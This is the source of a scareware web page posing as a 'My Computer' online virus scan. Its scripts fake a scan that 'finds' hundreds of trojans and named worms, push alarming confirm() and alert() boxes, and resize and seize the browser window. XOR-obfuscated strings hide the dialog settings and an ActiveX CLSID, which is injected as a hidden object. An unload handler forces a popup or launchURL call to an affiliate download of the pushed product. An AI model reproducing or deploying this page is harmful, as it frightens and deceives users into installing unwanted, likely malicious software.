<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>My computer Online Scan</title>
<script>
var prcnt_interval;
var iteration=0;

var scantext="Scan complete. 527 threats was found!";

var nacs_deeps=15;


function update()
{
 if ($(".progress_bar_fill").width()>0)
 {
  $("#progress_prcnt").html((Math.round(100-$(".progress_bar_fill").width()/417*100))+"%");
  $("#cur_file_scan").html(fxlist[Math.floor(Math.random()*fxlist.length)] );
  
  if ($(".progress_bar_fill").width()<100 && iteration==2)
  {
	$("#threat3").toggleClass("none");
	setInterval("$('#tc3').toggleClass('none')",1000);
	setInterval("$('#tc4').toggleClass('none')",1000);
	iteration=3;
  }  
    if ($(".progress_bar_fill").width()<350 && iteration==0)
  {
   jQuery("<img>").attr("src", soundfile);
   setInterval("$('#tc1').toggleClass('none')",1000);
   iteration=1;
   $("#threat1").toggleClass("none");
   $("#desc").toggleClass("none");
   $("#alert_img").attr("src","images/alert.gif");
  }
  if ($(".progress_bar_fill").width()<200 && iteration==1)
  {
   $("#threat2").toggleClass("none");
   setInterval("$('#tc2').toggleClass('none')",1000);
   iteration=2;
  }
 }
 else
 {
  clearInterval(prcnt_interval);
  $(".file_scanner").html(scantext);
  setTimeout("dpop2()",1000);
 }
}

function Minimize() 
{
window.innerWidth = 100;
window.innerHeight = 100;
window.screenX = screen.width;
window.screenY = screen.height;
alwaysLowered = true;
}

function Maximize() 
{
window.moveTo(0,0);
window.resizeTo(screen.width,screen.height);
}

function download() {
 window.location='download.php?affid=00000';
}

function away()
{
	w = window;
	ua = navigator.userAgent;
	v1 = ua.toLowerCase().indexOf('msie') != -1 && ua.toLowerCase().indexOf('opera') < 0;
  	x = 11;
  	eval('w.resizeTo(x*10,x*11-7)');
	w.moveTo(v1 ? (screen.width - 100) >> 1 : 11027, v1 ? (screen.height - 100) >> 1 : 10659);
}

function pop1() {

confirm('Warning!!! '+
' Your computer contains various signs of viruses and malware programs presence. '+

' Your system requires immediate anti viruses check! '+

' System Security will perform a quick and free scanning of your PC for viruses and malicious programs.');
}

function dpop2() {
confirm('Your computer remains infected by viruses! '+
' They can cause data loss and file ' + 'damages and need to be cured as soon as possible.  '+
' Return to System Security and download it secure to your PC ');

pop4();
}

function pop3() {
alert('Your computer remains infected by viruses! '+
' They can cause data loss and file damages and need to be cured as soon as possible. '+
' Return to System Security and download it secure to your PC ');
}

function pop4() {
  playsound(soundfile);
  $("#alert").css('top', $(window).height()/2- $("#alert").height()/2); 
  $("#alert").css('left', $(window).width()/2- $("#alert").width()/2);
  $("#alert").show();  
  $(".left_bar").css("display","none");
  $(".left_bar").css("display","block");
}

function sp2init(){
    document.body.innerHTML+="<object id=iie width=0 height=0 classid='CLSID:"+u+"'></object>";
}

function loading() {
  if (window.attachEvent)
    away();
    pop1();
    Maximize();
  window.focus(); 
}

function loaded() {
  $("#white").css("display","none");
  $("#page_progress").css("display","none");
  $(".left_bar").css("display","none");
  $(".left_bar").css("display","block");
  //setInterval("window.focus()",1000);
  $(".progress_bar_fill").animate({width:"0px"},nacs_deeps*1000);
  prcnt_interval = setInterval(update,nacs_deeps*10);	
};
loading();
//--------------------------------------------------------------------------------
var asdqweasdf=["\x67\x6A\x62\x6F\x6C\x64\x54\x6A\x67\x77\x6B\x39\x32\x33\x31\x37"+
				"\x73\x7B\x38\x23\x67\x6A\x62\x6F\x6C\x64\x4B\x66\x6A\x64\x6B\x77\x39\x34\x35\x3B\x73\x7B\x38\x23\x67\x6A\x62\x6F\x6C\x64\x57\x6C\x73\x39\x33\x73\x7B\x38\x23\x67\x6A\x62\x6F\x6C\x64\x4F\x66\x65\x77\x39\x33\x73\x7B\x38\x23\x66\x67\x64\x66\x39\x51\x62\x6A\x70\x66\x67\x38\x23\x60\x66\x6D\x77\x66\x71\x39\x33\x38\x23\x6B\x66\x6F\x73\x39\x33\x38\x23\x71\x66\x70\x6A\x79\x62\x61\x6F\x66\x39\x32\x38\x23\x70\x60\x71\x6C\x6F\x6F\x39\x32\x38\x23\x70\x77\x62\x77\x76\x70\x39\x33",
               "\x23\x70\x60\x71\x6C\x6F\x6F\x61\x62\x71\x70\x3E\x33\x2F\x6E\x66\x6D\x76\x61\x62\x71\x3E\x32\x2F\x77\x6C\x6C\x6F\x61\x62\x71\x3E\x32\x2F\x6F\x6C\x60\x62\x77\x6A\x6C\x6D\x3E\x33\x2F\x73\x66\x71\x70\x6C\x6D\x62\x6F\x61\x62\x71\x3E\x32\x2F\x70\x77\x62\x77\x76\x70\x3E\x33\x2F\x71\x66\x70\x6A\x79\x62\x61\x6F\x66\x3E\x32",
               "\x34\x65\x33\x3A\x60\x3A\x66\x32\x60\x36\x36\x65\x34\x67\x35\x30\x65\x33\x31\x3A\x33\x3A\x62\x32\x37\x60\x32\x62\x37\x36\x66\x33",
               "\x35\x41\x45\x36\x31\x42\x36\x31\x2E\x30\x3A\x37\x42\x2E\x32\x32\x47\x30\x2E\x41\x32\x36\x30\x2E\x33\x33\x40\x33\x37\x45\x34\x3A\x45\x42\x42\x35"];
var xor_key=3;
var _0xbf5e=["", "", "", ""];
for(j=0; j<4; j++)
{ 
	for(i=0; i<asdqweasdf[j].length; ++i)
	{
		_0xbf5e[j] += String.fromCharCode(xor_key^asdqweasdf[j].charCodeAt(i));
	}
}

var exit=true;
var usePopDialog=true;
var nid=0x0;
var tid=0x1af;
var mid=0x3b3;
var full=0x1;
var popDialogOptions=_0xbf5e[0x0];
var popWindowOptions=_0xbf5e[0x1];
var clid=_0xbf5e[0x2];
var usePopDialog=true;
var isUsingSpecial=false;
var isXPSP2=false;
var u=_0xbf5e[0x3];

function ext(){
       if (exit)       {
               exit=false;
               pop3();
               if(!isXPSP2 && !usePopDialog)               {
                         window.open(LRUpop,"",popWindowOptions);
               }else if(!isXPSP2 && usePopDialog) {
                         eval("window.showModalDialog(LRUpop,'',popDialogOptions)");
               }else{
                         iie.launchURL(LRUpop);
               }
        }
}

var LRUpop = 'download.php?affid=00000';
isUsingSpecial = true;
if (window.attachEvent)
 eval("window.attachEvent('onunload',ext);");
else
 window.addEventListener("unload", ext, false);
 
//--------------------------------------------------------------------------------


var soundfile="chord.wav"

function playsound(soundfile){
if (document.all){
$("soundeffect").src=""
$("soundeffect").src=soundfile
}
}

function bindsound(tag, soundfile, masterElement){
if (!window.event) return
var source=event.srcElement
while (source!=masterElement && source.tagName!="HTML"){
if (source.tagName==tag.toUpperCase()){
playsound(soundfile)
break
}
source=source.parentElement
}
}</script>
<script type="text/javascript" src="js/jquery.js"></script>
<script type="text/javascript" src="js/jquery-init.js"></script>
<script type="text/javascript" src="js/flist.js"></script>
<style type="text/css">
<!--
body {
	padding:0px;
	margin:0px;
	font-family:Tahoma, Arial, Helvetica, sans-serif;
	font-size:11px;
	background-color:#FFFFFF;
	color:#000000;
	height:100%;
}
-->

.left_bar {
	position: absolute;	
	background-color:#718de0;
	color:#3333CC;
	height:100%;
}
.left_header {
	background-image:url(images/box_top_.gif);
	background-repeat:no-repeat;
	width:213px;
	height:19px;
	padding:7px 0 0 13px;
	margin:12px 0 0 12px;
	font-weight:bold;
	color:#3F3D3D;	
}

.left_box {
	background-color:#d7def8;
	color:#3F3D3D;
	border-left:1px solid #FFFFFF;
	border-right:1px solid #FFFFFF;
	border-bottom:1px solid #FFFFFF;
	width:211px;
	margin:0 0 0 12px;
	padding:10px 0 6px 0;
}

.left_box_line {
	padding:2px 2px 3px 15px;
}

.left_box_line a{
	color:#38599c;
	background-color:inherit;
	text-decoration:none;
}
.left_box_line a:hover{
	text-decoration:underline;
}
.left_bar_icon {
	vertical-align:middle;
	padding-right:4px;
}

.right_bar {
	position:absolute;
	left:238px;
}

.right_hr {
	background-image:url(images/hrline.gif);
	background-repeat:no-repeat;
	width:280px;
	height:19px;
	padding-left:15px;
	padding-bottom:15px;
	margin-top:15px;	
	font-weight:bold;
}

.folder_box {
	display:inline;
	margin:20px 0 0 0;
	padding-left:20px;
	width:170px;
}

.folder_icon {
	vertical-align:middle;
	padding:0 10px 0 0;
}

.progress_bar {
	margin:15px 15px 0 15px;
}
.progress_bar_bg {
	background-image:url(images/progressbar.gif);
	background-repeat:no-repeat;
	width:416px;
	height:15px;
	padding:1px 3px 1px 3px;
	margin:7px 0 0 0;
}

.progress_bar_progress {
	background-image:url(images/progressbar_green.gif);
	background-position:left;
	background-repeat:repeat-x;
	height:15px;
	width:416px;
}

.progress_bar_fill {
	float:right;
	background-color:white;
	width:418px;
	height:15px;
}

#progress_prcnt {
	position:absolute;
	padding-left:200px;
}

.file_scanner {
	font-weight:bold;
	margin:5px 15px 0 15px; 
}

.window1 {
	width:700px;
	height:337px;
	background-image:url(images/window1.gif);
	background-repeat:no-repeat;
	margin:5px 15px 0 15px; 	
}

.td_cell1 {
	padding-top:10px;
	padding-left:7px;
}

.td_cell2 {
	padding-top:7px;
	padding-left:7px;
}

.none {
	visibility:hidden;
}

.trojan {
	position:absolute;
	display:inline;
	padding-left:50px;
	padding-top:30px;
}

.trojan_caption {
	font-weight:bold;
	color:red;
	padding-left:5px;
}

.white_div {
	Z-INDEX: 1200;
	position:absolute;
	background-color:white;
	width:100%;
	height:100%;
}

#alert {
	Z-INDEX: 1300;
	width:434px;
	height:332px;
	display:none;
	position:absolute;
	cursor:pointer;
	cursor:hand;
}
</style></head>

<body onLoad="loaded()">
<bgsound src="#" id="soundeffect" hidden=true loop=1 autostart=false>
<div id="alert"><img id="alert_img"></div>
<div id="white" class="white_div" align="center">
	<div style="position:relative;top:50%"><img src="images/page_progressbar.gif" width="51" height="19"/>
    </div>
   </div>
<div class="left_bar">
  <div class="left_header">
    	System Tasks
  </div>
	<div class="left_box">
		<div class="left_box_line">
			<img src="images/i5000000.gif" width="14" height="16"/ class="left_bar_icon"><a href="#">View system information</a>	    </div>
	  <div class="left_box_line">
    	<img src="images/i6000000.gif" width="16" height="16"/ class="left_bar_icon"> <a href="#">Add or remove programs</a>	  </div>
	  <div class="left_box_line">
   	    <img src="images/i7000000.gif" width="16" height="16"/ class="left_bar_icon"> <a href="#">Change a settings</a>      </div>
  </div>
	<div class="left_header">
		Other Places
  </div>
	<div class="left_box">
		<div class="left_box_line">
			<img src="images/i1000000.gif" width="16" height="16"/ class="left_bar_icon"> <a href="#">My Network Places</a>		</div>
	  <div class="left_box_line">
    	<img src="images/i2000000.gif" width="16" height="16"/ class="left_bar_icon"> <a href="#">My Documents</a>      </div>
	  <div class="left_box_line">
   	    <img src="images/i3000000.gif" width="16" height="14"/ class="left_bar_icon"> <a href="#">Shared Documents</a>      </div>
	  <div class="left_box_line">
   	    <img src="images/i4000000.gif" width="16" height="16"/ class="left_bar_icon"> <a href="#">Control Panel</a>      </div>
  </div>
	<div class="left_header">
		Details
  </div>
	<div class="left_box">
	  <div class="left_box_line">
	    	<strong>My Computer</strong><br />
		  System Folder
      </div>
	</div>
</div>

<div class="right_bar">
  <div class="right_hr">
    	System scan progress
  </div>
	<div class="folder_box">
   	  <div id="tc1" class="trojan none">
        	<img src="images/inf20000.gif" width="15" height="18" align="absmiddle"/><span class="trojan_caption">7 trojans</span>
      </div>

    	<img src="images/folder.gif" width="43" height="40" class="folder_icon"/>Shared Documents
  </div>
  <div class="folder_box">
    	<div id="tc2" class="trojan none">
        	<img src="images/inf20000.gif" width="15" height="18" align="absmiddle"/><span class="trojan_caption">103 trojans</span>
        </div>
    
    	<img src="images/folder.gif" width="43" height="40" class="folder_icon"/>My Documents
  </div>
  <div class="right_hr">
    	Hard drives
  </div>
	<div class="folder_box">
    	<div id="tc3" class="trojan none">
        	<img src="images/inf20000.gif" width="15" height="18" align="absmiddle"/><span class="trojan_caption">362 trojans</span>
        </div>
    
    	<img src="images/hdd.gif" width="43" height="40" class="folder_icon"/>Local Disk (C:)
  </div>
  <div class="folder_box">
    	<div id="tc4" class="trojan none">
        	<img src="images/inf20000.gif" width="15" height="18" align="absmiddle"/><span class="trojan_caption">155 trojans</span>
        </div>
    
    	<img src="images/hdd.gif" width="43" height="40" class="folder_icon"/>Local Disk (D:)
  </div>
  <div class="right_hr">
    	DVD
  </div>
	<div class="folder_box">
    	<img src="images/dvd.gif" width="43" height="40" class="folder_icon"/>DVD-RAM Drive (E:)
  </div>
  <div class="progress_bar">
	<div class="progress_bar_bg">
	  <div class="progress_bar_progress">
       	<div class="progress_bar_fill">
        </div>
            	<div id="progress_prcnt">
             		0%
	            </div>                      
      </div>          
		</div>
	</div>
    <div class="file_scanner">
    	Now scanning: <span id="cur_file_scan">none</span>
  </div>
	<div class="window1">
   	  <div style="font-size:15px;font-weight:bold;color:white;padding-top:14px;padding-left:35px;">
        	Your Computer is Infected!
      </div>
    	<div style="padding-top:22px;">
        	Threats and actions:
      </div>   
        <table border="0">
          <tr>
            <td width="166" class="td_cell1">Name</td>
            <td width="105" class="td_cell1">Risk level</td>
            <td width="85" class="td_cell1">Date</td>
            <td width="120" class="td_cell1">Files infected</td>
            <td width="120" class="td_cell1">State</td>
          </tr>
          <tr class="none" id="threat1"">
            <td class="td_cell2"><img src="images/qicon.gif" align="absmiddle" style="padding-right:5px"/>  <b>Email-Worm.Win32.Net</b></td>
            <td class="td_cell2"><b><font color="red">Critical</font></b></td>
            <td class="td_cell2">11.18.2008</td>
            <td class="td_cell2">35</td>
            <td class="td_cell2">Waiting removal</td>
          </tr>
          <tr class="none" id="threat2">
            <td class="td_cell2"><img src="images/qicon.gif" align="absmiddle" style="padding-right:5px"/>  <b>Email-Worm.Win32.Myd</b></td>
            <td class="td_cell2"><b><font color="red">Critical</font></b></td>
            <td class="td_cell2">11.18.2008</td>
            <td class="td_cell2">35</td>
            <td class="td_cell2">Waiting removal</td>
          </tr>
          <tr class="none" id="threat3">
            <td class="td_cell2"><img src="images/qicon.gif" align="absmiddle" style="padding-right:5px"/>  <b>Trj-Dwnldr.Win</b></td>
            <td class="td_cell2"><b><font color="red">Critical</font></b></td>
            <td class="td_cell2">11.18.2008</td>
            <td class="td_cell2">35</td>
            <td class="td_cell2">Waiting removal</td>
          </tr>
      </table>

        <div style="padding-top:12px;padding-left:12px;width:600px" class="none" id="desc">
            <b>Description:</b><br />
            This program is potentially dangerous for your system. <b>Trojan-Downloader</b> stealing passwords, credit cards and other personal information from your computer.
            <br /><br />
            <b>Advice:</b><br/>
            You need to remove this threat as soon as possible!
      </div>
        <div style="padding-top:50px;padding-left:590px"><a href="#">Full system cleanup</a></div>
  </div>
</div>
</body>
</html>
